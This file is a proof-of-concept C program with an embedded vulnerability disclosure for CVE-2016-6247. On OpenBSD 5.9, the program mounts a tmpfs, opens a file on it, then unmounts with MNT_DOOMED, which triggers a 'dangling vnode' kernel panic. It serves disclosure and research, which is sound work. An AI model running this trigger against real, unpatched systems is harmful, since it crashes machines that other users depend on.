/*
 * unmount_panic.c
 *    Demonstrate a panic through the unmount system call.
 *
 * gcc -g unmount_panic.c -o unmount_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Unmounting with MNT_DOOMED flag can lead to a kernel panic

Impact:
Root users or users on systems with kern.usermount set to true can
trigger a kernel panic when unmounting a filesystem.

Description:
When the unmount system call is called with the MNT_DOOMED flag
set, it does not sync vnodes. This can lead to a condition where
there is still a vnode on the mnt_vnodelist, which triggers a
panic in dounmount().

    if (!LIST_EMPTY(&mp->mnt_vnodelist))
        panic("unmount: dangling vnode");

This condition can only be triggered by users who are allowed
to unmount a filesystem. Normally this is the root user, but
if the kern.usernmount sysctl variable has been set to true,
any user could trigger this panic.

Reproduction:
Run the attached unmount_panic.c program.  It will mount a new
tmpfs on /mnt, open a file on it, and then unmount /mnt with
the MNT_DOOMED flag. This will lead to a panic of "unmount: dangling vnode".
NCC Group was able to reproduce this issue on OpenBSD 5.9 release 
running amd64.

Recommendation:
TBD
[OpenBSD developers decided to reject all flags other than MNT_FORCE].

Reported: 2016-07-12
Fixed:   http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/vfs_syscalls.c.diff?r1=1.261&r2=1.262
Assigned: CVE-2016-6247
#endif // BUG_WRITEUP ---------------------------------------------------


#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/param.h>
#include <sys/mount.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

int main(int argc, char **argv)
{
    struct tmpfs_args args = { TMPFS_ARGS_VERSION, 0, 0, 0, 0, 0 };
    int x, fd;

    x = mount("tmpfs", "/mnt", 0, &args);
    xperror(x == -1, "mount");

    fd = open("/mnt/somefile", O_RDWR | O_CREAT, 0666);
    xperror(fd == -1, "/mnt/somefile");

    x = unmount("/mnt", MNT_DOOMED);
    xperror(fd == -1, "unmount");

    printf("no crash!\n");
    return 0;
}

